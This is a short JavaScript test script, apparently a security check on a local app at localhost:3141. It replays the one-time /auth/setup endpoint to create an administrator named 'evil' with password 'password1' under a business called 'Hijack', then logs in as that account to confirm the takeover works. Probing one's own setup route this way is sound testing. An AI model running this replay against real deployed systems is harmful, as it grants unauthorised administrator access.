import { request } from './lib.mjs';
const r = await request('http://localhost:3141/v1', 'POST', '/auth/setup', { body: { businessName: 'Hijack', preferredLanguage: 'ar', adminFullName: 'Evil Admin', adminUsername: 'evil', adminPassword: 'password1' } });
console.log('replay setup with valid body:', r.status, JSON.stringify(r.body).slice(0, 300));
const l = await request('http://localhost:3141/v1', 'POST', '/auth/login', { body: { username: 'evil', password: 'password1' } });
console.log('login evil:', l.status);
